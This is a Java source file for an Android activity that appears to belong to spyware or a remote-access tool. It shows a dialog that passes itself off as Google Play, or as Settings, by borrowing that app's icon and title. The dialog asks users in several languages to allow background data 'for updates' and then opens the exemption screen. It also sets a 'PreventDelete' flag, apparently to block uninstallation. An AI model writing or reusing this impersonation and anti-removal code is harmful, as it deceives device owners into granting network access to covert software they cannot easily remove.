package com.icontrol.protector;

import static android.net.ConnectivityManager.RESTRICT_BACKGROUND_STATUS_ENABLED;

import static com.icontrol.protector.UtliTools.getLabelApplication;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import java.util.Locale;

public class RequestDataUsage extends Activity {

    boolean isregisterd = false;
    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager.isActiveNetworkMetered()) {
            // Checks user’s Data Saver settings.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                switch (connectivityManager.getRestrictBackgroundStatus()) {
                    case RESTRICT_BACKGROUND_STATUS_ENABLED:
                        askit();
                        break;
                    default:
                        AccessServices.PreventDelete =false;
                        finish();
                        break;
                }
            }

            registerReceiver(dataSaverChangedBroadcastReceiver, new IntentFilter(ConnectivityManager.ACTION_RESTRICT_BACKGROUND_CHANGED));
            isregisterd = true;
        }else
        {
            finish();

            AccessServices.PreventDelete =false;
        }

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        try {
            if (isregisterd)
                unregisterReceiver(dataSaverChangedBroadcastReceiver);
        }catch (Exception a){}
    }
    private DataSaverChangedBroadcastReceiver dataSaverChangedBroadcastReceiver = new DataSaverChangedBroadcastReceiver();

    private static class DataSaverChangedBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
        }
    }
    public void askit(){
        String CurrnetLanuage = Locale.getDefault().getLanguage();
        //Toast.makeText(this,"Enable Draw over apps For : " + getString(R.string.f1f2f3f4f5f6), Toast.LENGTH_LONG).show();
        final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert);

        String buttonnameOK="OK";
        String MYNAME = "";


        MYNAME = getLabelApplication(getApplicationContext()).toLowerCase();

        switch (CurrnetLanuage) {
            case "en":
                buttonnameOK = "Enable";
                alertDialog.setMessage("Allow " + MYNAME + " to use background data for updates.");
                break;
            case "ar":
                buttonnameOK = "تفعيل";
                alertDialog.setMessage("اسمح لـ " + MYNAME + " باستخدام البيانات في الخلفية للتحديثات.");
                break;
            case "zh":
                buttonnameOK = "启用";
                alertDialog.setMessage("允许 " + MYNAME + " 在后台使用数据以获取更新。");
                break;
            case "tr":
                buttonnameOK = "Tamam";
                alertDialog.setMessage(MYNAME + " uygulamasının güncellemeler için arka planda veri kullanmasına izin verin.");
                break;
            case "ru":
                buttonnameOK = "Включить";
                alertDialog.setMessage("Разрешите " + MYNAME + " использовать данные в фоновом режиме для обновлений.");
                break;
            default:
                buttonnameOK = "OK";
                alertDialog.setMessage("Allow " + MYNAME + " to use background data for updates.");
                break;
        }

        try {
            // Try to get the Google Play icon
            Drawable icon = getPackageManager().getApplicationIcon("com.android.vending");
            alertDialog.setIcon(icon);
            alertDialog.setTitle("Google Play");
        } catch (PackageManager.NameNotFoundException e) {
            try {
                // Try to use the Settings app icon as a fallback
                Drawable settingsIcon = getPackageManager().getApplicationIcon("com.android.settings");
                alertDialog.setIcon(settingsIcon);
                alertDialog.setTitle("Settings");
            } catch (PackageManager.NameNotFoundException ex) {
                try {
                    // If Settings app icon is not found, use your app's own icon
                    Drawable appIcon = getPackageManager().getApplicationIcon(getPackageName());
                    alertDialog.setIcon(appIcon);
                    alertDialog.setTitle(MYNAME); // Use your app's name as title
                } catch (PackageManager.NameNotFoundException exc) {
                    // Log the error or handle it as needed
                    exc.printStackTrace();
                    // Optionally, set a default fallback title and no icon
                    alertDialog.setIcon(null);
                    alertDialog.setTitle("");
                }
            }
        }


        alertDialog.setPositiveButton(buttonnameOK, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                AccessServices.PreventDelete =true;

                try
                {
                    Intent intent = new Intent(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }catch (Exception a){

                }

                RequestDataUsage.this.finish();
                return;
            }
        });


        alertDialog.show();

    }
    @Override
    public void finish() {

        super.finish(); // This will remove the activity from the screen
    }
}
